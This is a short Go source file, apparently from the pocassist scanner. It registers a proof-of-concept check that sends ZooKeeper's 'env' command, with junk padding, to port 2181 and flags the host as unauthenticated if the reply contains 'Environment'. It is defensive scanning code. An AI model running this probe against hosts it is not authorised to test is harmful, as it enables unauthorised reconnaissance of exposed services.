package scripts

import (
	"bytes"
	"github.com/jweny/pocassist/pkg/util"
)

// ZookeeperUnauthority zookeeper 未授权
func ZookeeperUnauthority(args *ScriptScanArgs) (*util.ScanResult, error) {
	addr := args.Host + ":2181"
	payload := []byte("envidddfdsfsafafaerwrwerqwe")
	resp, err := util.TcpSend(addr, payload)
	if err != nil {
		return nil, err
	}
	if bytes.Contains(resp, []byte("Environment")) {
		return util.VulnerableTcpOrUdpResult(
			addr,"",
			[]string{string(payload)},
			[]string{string(resp)}), nil
	}
	return &util.InVulnerableResult, nil
}

func init() {
	ScriptRegister("poc-go-zookeeper-unauth", ZookeeperUnauthority)
}
